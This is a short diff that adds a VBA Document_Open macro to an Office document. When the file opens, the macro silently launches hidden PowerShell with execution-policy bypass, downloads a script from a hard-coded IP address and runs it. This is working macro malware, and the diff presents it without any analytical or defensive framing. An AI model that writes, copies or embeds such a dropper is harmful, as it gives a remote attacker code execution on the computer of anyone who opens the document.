@@ -1,0 +1,6 @@
+Private Sub Document_Open()
+    Dim strCmmnd As String
+    strCmmnd = "powershell.exe -NoP -NonI -w hidden -Exec bypass iex(New-Object Net.WebClient).DownloadString('http://34.213.170.51/PS_Bot/Pload_DirtyLow.txt')"
+    Set WshShell = CreateObject("WScript.Shell")
+    WshShell.Run strCmmnd, 0, True
+End Sub
